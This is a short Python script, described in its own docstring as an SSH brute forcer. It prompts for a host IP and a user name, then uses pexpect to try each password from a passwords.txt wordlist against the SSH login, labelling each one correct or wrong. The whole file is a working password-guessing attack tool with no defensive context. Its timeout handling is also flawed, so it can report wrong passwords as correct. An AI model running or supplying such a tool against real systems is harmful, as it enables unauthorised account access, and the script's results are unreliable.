#!/usr/bin/python3

import os
import sys
import pexpect
import inspect
import subprocess
from termcolor import colored


"""ssh brute forcer..."""

PROMPT = ['\$ ', '# ', '> ', '>> ', '>>> ']

def lineno():
    return inspect.currentframe().f_back.f_lineno


def login(host, user, pawd):
    auth_str = "Are you sure you want to continue"
    login = f"ssh {user}@{host}"

    try:
        child = pexpect.spawn(login)
    except pexpect.exceptions.ExceptionPexpect as e:
        print(e)
        exit(1)

    ret = child.expect([pexpect.TIMEOUT, auth_str, '[P|p]assword: '])
    if ret == 0:
        print(colored(f"{lineno()}::spawn process timed out...", 'red'))
        return
    elif ret == 1:
        child.sendline("yes")
        ret = child.expect([pexpect.TIMEOUT, '[P|p]assword: '])
        if ret == 0:
            print(colored(f"{lineno()}::spawn process timed out...", 'red'))
            return
    child.sendline(pawd)
    ret = child.expect(PROMPT, timeout=.5)
    return child

def read_file(host, user):
    with open('passwords.txt') as file:
        for password in file.readlines():
            password = password.strip()
            try:
                child = login(host, user, password)
                print(colored(f"{password} is the CORRECT password...", 'green'))
            except:
                print(colored(f"{password} is the WRONG password...", 'red'))



def main():
    subprocess.call('clear', shell=True)

    host = input(colored("Enter the host IP address: ", 'yellow'))
    user = input(colored("Enter the user name: ", 'yellow'))

    read_file(host, user)

if __name__ == "__main__":
    main()
